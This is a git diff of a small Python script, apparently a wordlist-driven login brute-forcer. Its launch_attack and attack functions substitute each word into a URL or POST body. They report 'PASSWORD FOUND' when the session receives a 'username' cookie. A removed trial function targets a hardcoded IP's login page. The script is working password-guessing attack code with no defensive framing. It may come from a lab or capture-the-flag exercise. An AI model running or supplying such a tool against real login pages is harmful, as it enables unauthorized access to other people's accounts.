@@ -4,10 +4,6 @@ import time
 import getopt
 import re
 
-from selenium import webdriver
-from selenium.webdriver.common.keys import Keys
-from selenium.webdriver.common.desired_capabilities import DesiredCapabilities
-
 
 def main():
     argv = sys.argv[1:]
@@ -42,7 +38,7 @@ def main():
 
 
 def launch_attack(names, url, payload):
-    print("Time" + "\t" + "\t code \t\tchars\t\twords\t\tlines")
+    print("Launching Attack!")
     for name in names:
         word = name.split("\n")[0]
         pl = ""
@@ -53,42 +49,25 @@ def launch_attack(names, url, payload):
         attack(word, url.replace('FUZZ', word), pl)
 
 def attack(word, url, payload):
+    s = requests.Session()
+
     start = time.time()
     if payload == "":
-        r = requests.get(url)
+        r = s.get(url)
         elaptime = time.time()
         totaltime = str(elaptime - start)[1:10]
     else:
         list = payload.replace("=", " ").replace("&", " ").split(" ")
         payload = dict([(k, v) for k,v in zip(list[::2], list[1::2])])
-        r = requests.post(url, data=payload)
+        r = s.post(url, data=payload)
         elaptime = time.time()
         totaltime = str(elaptime - start)[1:10]
 
-    # lines = str(r.content.count("\n"))
-    chars = str(len(r._content))
-    words = str(len(re.findall("\S+", r.content.decode())))
-    code = int(str(r.status_code))
-
-    # if r.history != []:
-    #     first = r.history[0]
-    #     code = str(first.status_code)
-    # else:
-    #     pass
-
-    print(code)
-    if 200 <= code < 300:
-        print(totaltime + "\t"  + str(code), "   \t\t" + word + " \t\t" + words + " \t\t " +"\t" + r.headers["server"] + "\t" + word)
+    if 'username' in s.cookies.get_dict():
         print("PASSWORD FOUND: " + word)
         sys.exit(1)
-    elif 400 <= code < 500:
-        print(totaltime + "\t" + code, "   \t\t" + word + " \t\t" + words + " \t\t "  + "\t" + r.headers["server"] + "\t" +  word)
-    elif 300 <= code < 400:
-        print(totaltime + "\t" + code, "   \t\t" + word + " \t\t" + words + " \t\t " + "\t"+ r.headers["server"] + "\t" + word)
     else:
-        pass
+        print("trying " + word + " time taken: " + totaltime)
 
-#  main()
 
-def trial():
-    r = requests.post("http://46.101.91.7/login", data=payload)
+main()
